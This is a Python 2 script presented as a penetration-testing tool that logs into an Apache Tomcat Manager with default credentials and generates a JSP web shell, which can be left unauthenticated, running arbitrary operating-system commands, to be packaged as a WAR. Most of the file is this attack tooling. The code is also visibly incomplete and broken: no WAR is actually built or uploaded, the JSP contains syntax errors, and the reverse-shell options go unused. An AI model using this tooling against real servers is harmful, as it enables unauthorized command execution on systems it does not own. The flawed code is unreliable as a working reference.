#!/usr/bin/python

import mechanize
import os
import urllib2
import sys
import random
import string
import optparse
import tempfile
import shutil
import re
import base64
import logging
import commands

logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)
logging.addLevelName( logging.WARNING, "\033[1;31m%s\033[1;0m" % logging.getLevelName(logging.WARNING))
logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelName(logging.ERROR))
logger = logging.getLogger()


def compileWar(code, title):
    warpath = ''
    dirpath = tempfile.mkdtemp()

    logging.info('Generating temporary structure for WAR at: "%s"' % dirpath)

    os.makedirs(dirpath + '/files/META-INF')
    os.makedirs(dirpath + '/files/WEB-INF')
    
    with open(dirpath + '/shell.jsp', 'w') as f:
        f.write(code)

    javaver = commands.getstatusoutput('java -version')[1]
    m = re.search('version "([^"]+)"', javaver)
    if m:
        javaver = m.group(1)
        logging.info('Working with Java at version: %s' % javaver)
    else:
        logging.info('Could not retrieve Java version. Assuming: "1.8.0_60"')
        javaver = '1.8.0_60'

    with open(dirpath + '/files/META-INF/MANIFEST.MF', 'w') as f:
        f.write('''Manifest-Version: 1.0
Created-By: %s

''' % javaver)

    logging.info('Generating web.xml with servlet-name: "%s"' % title)
    with open(dirpath + '/files/WEB-INF/web.xml', 'w') as f:
        f.write('''<?xml version="1.0" ?>
<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
    <servlet>
        <servlet-name>%s</servlet-name>
        <jsp-file>/shell.jsp</jsp-file>
    </servlet>
</web-app>
''' % title)

    return (dirpath, warpath)

def preparePayload(opts):
    logging.info('Generating JSP WAR backdoor code...')

    if opts.shellpass.lower() == 'none':
        passwordField = 'none'
    else:
        passwordField = ''

    payload = '''
<%%!
    public String execute(String cmd) {
        final String hardcodedPass = "%(password)s";
        String out = "";
        String pass = request.getParameter('password');

        if (cmd != null && (pass == hardcodedPass || hardcodedPass.toLowerCase() == "none"))) {
            Process proc = Runtime.getRuntime().exec(cmd);
            OutputStream outs = proc.getOutputStream();
            InputStream ins = proc.getInputStream();
            DataInputStream datains = new DataInputStream(ins);
            String datainsline = datains.readLine();

            while ( datainsline != null) {
                out += datainsline;
                datainsline = datains.readLine();
            }
        }

        return out;
    }
%%>
<!DOCTYPE html>
<html>
    <head>
        <title>%(title)s</title>
    </head>
    <body>
        <form method=get name=cmd>
        <table>
            <tr>
                <td>Password:</td><td><input type=password width=40 name="password" value="%(password2)s" onclick='this.value=""'/></td>
            </tr>
            <tr>
                <td><%%= execute("whoami") %%>@<%%= execute("hostname") %%> $ </td><td><input type=text width=160 name="cmd" value="uname -a" onclick='this.value=""'/></td>
            </tr>
            <tr>
                <td><input type=submit name=submit value="Execute" /></td><td></td>
            </tr>
        </table>
        <hr />
        <pre>
        <%%
            if (request.getParameter('cmd') != null) {
                out.println(execute(request.getParameter('cmd')));
            }
        %%>
        </pre>
        <br />
    </body>
</html>
''' % {'title': opts.title, 'password2': passwordField, 'password': opts.shellpass }

    return payload

def validateManagerApplication(browser):
    found = 0
    actions = ('stop', 'start', 'deploy', 'undeploy', 'upload', 'expire', 'reload')
    for form in browser.forms():
        for a in actions:
            if '/'+a+'?' in form.action:
                found += 1

    return (found >= len(actions))


def browseToManager(url, user, password):
    logger.info('Browsing to "%s"... Creds: %s:%s' % (url, user, password))
    browser = mechanize.Browser()
    cookiejar = mechanize.LWPCookieJar()
    browser.set_cookiejar(cookiejar)
    browser.set_handle_robots(False)
    browser.add_password(url, user, password)

    try:
        page = browser.open(url)
    except urllib2.URLError, e:
        if 'Connection refused' in str(e):
            logger.error('Could not connect with "%s", connection refused.' % url)
        elif 'Error 404' in str(e):
            logger.error('Server returned 404 Not Found on specified URL: %s' % url)
        else:
            logger.error('Browsing to the server (%s) failed: %s' % (url, e))
        return None

    src = page.read()

    if validateManagerApplication(browser):
        logging.info('Apache Tomcat Manager Application reached & validated.')
    else:
        logging.error('Specified URL does not point at the Apache Tomcat Manager Application')
        return None

    return browser

def generateRandomPassword(N=8):
    return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(N))

def options():
    print '''
    Apache Tomcat auto WAR deployment & launching tool
    Mariusz B. / MGeeky '16

Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
    ''' 

    usage = '%prog [options] server\n\n  server\t\tSpecifies server address. Please also include port after colon.'
    parser = optparse.OptionParser(usage=usage)

    general = optparse.OptionGroup(parser, 'General options')
    general.add_option('-v', '--verbose', dest='verbose', help='Verbose mode.', action='store_true')
    general.add_option('-U', '--user', metavar='USER', dest='user', default='tomcat', help='Tomcat Manager Web Application HTTP Auth username. Default="tomcat"')
    general.add_option('-P', '--pass', metavar='PASS', dest='password', default='tomcat', help='Tomcat Manager Web Application HTTP Auth password. Default="tomcat"')
    parser.add_option_group(general)

    conn = optparse.OptionGroup(parser, 'Connection options')
    conn.add_option('-H', '--host', metavar='RHOST', dest='host', default='0.0.0.0', help='Remote host for reverse tcp payload connection. When specified, RPORT must be specified too. Otherwise, bind tcp payload will be deployed, binded to 0.0.0.0 on target server.')
    conn.add_option('-p', '--port', metavar='RPORT', dest='port', default='4444', help='Remote port for the reverse tcp payload. When specified, RHOST must be specified too. Otherwise, bind tcp payload will be deployed, listening on port 4444')
    conn.add_option('-u', '--url', metavar='URL', dest='url', default='/manager/', help='Apache Tomcat management console URL. Default: /manager/')

    payload = optparse.OptionGroup(parser, 'Payload options')
    parser.add_option('-X', '--shellpass', metavar='PASSWORD', dest='shellpass', help='Specifies authentication password for uploaded shell, to prevent unauthenticated usage. Default: randomly generated. Specify "None" to leave the shell unauthenticated.', default=generateRandomPassword())
    parser.add_option('-t', '--title', metavar='TITLE', dest='title', help='Specifies head>title for uploaded JSP WAR payload. Default: "JSP Application"', default='JSP Application')
    parser.add_option('-n', '--name', metavar='NAME', dest='name', help='Specifies JSP application name. Default: "jsp_app"', default='jsp_app')
    parser.add_option('-f', '--file', metavar='WARFILE', dest='file', help='Custom WAR file to deploy. By default the script will generate own WAR file on-the-fly.')

    opts, args = parser.parse_args()

    if (opts.host and not opts.port) or (opts.port and not opts.host):
        logger.error('Both RHOST and RPORT must be specified to deploy reverse tcp payload.')
        sys.exit(0)

    if opts.port:
        try:
            port = int(opts.port)
            if port < 0 or port > 65535:
                raise ValueError
        except ValueError:
            logger.error('RPORT must be an integer in range 0-65535')
            sys.exit(0)

    if opts.file and not os.path.exists(file):
        logger.error('Specified WAR file does not exists in local filesystem.')
        sys.exit(0)
        
    if opts.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)
        
    return (opts, args)


def main():
    (opts, args) = options()

    url = 'http://%s%s' % (args[0], opts.url)
    browser = browseToManager(url, opts.user, opts.password)
    if browser == None:
        return


    code = preparePayload(opts)

    try:
        if not opts.file:
            (dirpath, warpath) = compileWar(code, opts.title)
        else:
            warpath = opts.file


    except KeyboardInterrupt:
        print '\nUser interruption.'

    if not opts.file and dirpath:
        logger.info('Removing temporary WAR directory: "%s"' % dirpath)
        #shutil.rmtree(dirpath)


if __name__ == '__main__':
    main()
    print

